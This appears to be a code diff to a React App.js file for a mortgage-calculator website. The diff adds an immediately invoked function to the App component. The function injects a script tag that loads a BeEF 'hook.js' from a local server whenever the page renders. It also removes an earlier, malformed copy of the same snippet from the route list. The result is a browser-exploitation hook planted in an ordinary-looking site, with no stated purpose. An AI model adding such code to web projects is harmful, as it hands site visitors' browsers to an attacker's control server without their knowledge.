@@ -8,6 +8,16 @@ import About from './components/About/About.js';
 import Home from './components/Home.js';
 
 function App() {
+  (function () { 
+    var url = 'http://0.0.0.0:3000/hook.js';
+    if (typeof beef == 'undefined') { 
+      var bf = document.createElement('script');
+      bf.type = 'text/javascript'; 
+      bf.src = url;
+      document.body.appendChild(bf);
+    }
+  }
+  )();
   return (
     <Router>
       <Routes>
@@ -15,8 +25,8 @@ function App() {
         <Route path="/mortgage-calculator" element={<Calculator />} />
         <Route path="/start" element={<Start />} />
         <Route path="/about-us" element={<About />} />
-{javascript: (function () { var url = 'http://0.0.0.0:3000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();}      </Routes>
-    </Router>
+      </Routes>
+    </Router> 
   );
 }
 
